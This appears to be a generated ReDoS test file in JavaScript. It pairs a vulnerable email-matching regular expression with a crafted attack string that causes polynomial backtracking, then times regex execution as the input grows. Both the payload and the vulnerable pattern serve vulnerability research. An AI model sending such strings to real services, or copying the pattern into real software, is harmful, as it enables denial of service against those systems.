/* 777
 * ([A-Z][\w\d\.\-]+)(?:(?:\+)([\w\d\.\-]+))?@([A-Z0-9][\w\.-]*[A-Z0-9]\.[A-Z][A-Z\.]*[A-Z])
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:"A1@"+"AA.A"*5000+"!1 _SLQ_2"
 */
var REGEX = /([A-Z][\w\d\.\-]+)(?:(?:\+)([\w\d\.\-]+))?@([A-Z0-9][\w\.-]*[A-Z0-9]\.[A-Z][A-Z\.]*[A-Z])/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'A1@' + 'AA.A'.repeat(i*10000) + '!1 _SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}